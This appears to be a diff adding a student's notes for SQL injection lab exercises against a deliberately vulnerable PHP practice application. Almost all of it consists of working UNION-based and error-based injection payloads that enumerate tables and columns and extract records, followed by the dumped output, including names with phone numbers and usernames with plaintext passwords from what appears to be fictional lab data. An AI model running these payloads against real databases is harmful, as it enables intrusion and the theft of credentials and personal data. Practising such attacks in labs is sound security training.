@@ -1,0 +1,101 @@
+LAB_1
+1.
+Server: Apache/2.4.3 (Win32), OpenSSL/1.0.1c PHP/5.4.7
+
+'union select null, null, null#
+Database: db.php, columns: 1,2,3
+
+'union select null, table_name, null from information_schema.tables#
+Tables: contacts, users, contacts_lab2, users_lab2, pproducts_lab3, uusers_lab3, cds
+
+'union select null, table_name, null from information_schema.tables where table_schema=database()#
+Tables used in current querry: contacts, users
+
+'union select null, column_name, null from information_schema.columns where table_name='users'#
+'union select null, column_name, null from information_schema.columns where table_name='contacts'#
+contacts: id, name, phone
+users: id, username, password
+
+2.
+'union select null, name, phone from users#
+13 records found
+John Smith        23412333
+Antti Piironen    234345234
+Kimmo Sauren      23423123
+Anssi Ikonen      2345234234
+Jack Brown        545663453
+Hammer            88834234
+Jyrki Kateinen    555234124
+Hytky Suoni       2123155
+Miss Suomi        555123123
+Jutta Urpilainen  92342344
+Jari Kurri        1231241423
+Aku Ankka         1313131313
+Tapani Kansa      6623452
+
+3.
+'union select null, username, password from users#
+Jack      Jackass
+Antti     asdfg
+Kimmo     qwerty
+Jartsa    salasana
+Hytky     sipuli
+Jutta     sdp_rules
+Aku       131313
+Tpsa      lalala
+Ms        word
+Cash      time
+Time      mmnnbb
+JoHn      A1A1A1
+AnSSi     Elect
+
+
+LAB_2
+Your job is to find:
+1) Server version and type
+2) All phone numbers of the company with person names
+3) All usernames and passwords
+
+1. Using Burp proxy
+  Server: Apache/2.4.3 (Win32) OpenSSL/1.0.1c PHP/5.4.7
+
+2. All phone numbers of the company with person names
+
+- to find out how many columns in this particular column keep adding null until number of columns matches
+  'union select null, null, null'
+
+- to find out which database is in use (attack_lab2)
+  'union select null, null, database()'
+
+- to find out all tables in database by incrementing limit 0,1/1,1 (contacts_lab2, users_lab2)
+  'union select
+    null,
+    null,
+    !( select * from (select table_name from information_schema.tables where table_schema=database() limit 0,1 ) as x) - ~0'
+
+- to find out table columns one by one by changing limit 1,1/2,1 (id, name, phone)
+  'union select
+    null,
+    null,
+    select !( select * from (select column_name from information_schema.columns where table_name="contacts_lab2" and table_schema=database() limit 0,1 ) as x) - ~0'
+
+- extract records from contacts_lab2 table one by one by incrementing limit 1,1/2,1
+  'union select
+    null,
+    null,
+    !( select * from (select phone from contacts_lab2 limit 0,1 ) as x) - ~0'
+
+
+3. All usernames and passwords
+
+- to find out table columns one by one by changing limit 1,1/2,1 (id, name, phone)
+  'union select
+    null,
+    null,
+    !( select * from (select column_name from information_schema.columns where table_name="users_lab2" and table_schema=database() limit 0,1 ) as x) - ~0'
+
+- extract records from users_lab2 tables in similar manner
+  'union select
+    null,
+    null,
+    !( select * from (select username from users_lab2 limit 0,1 ) as x) - ~0'
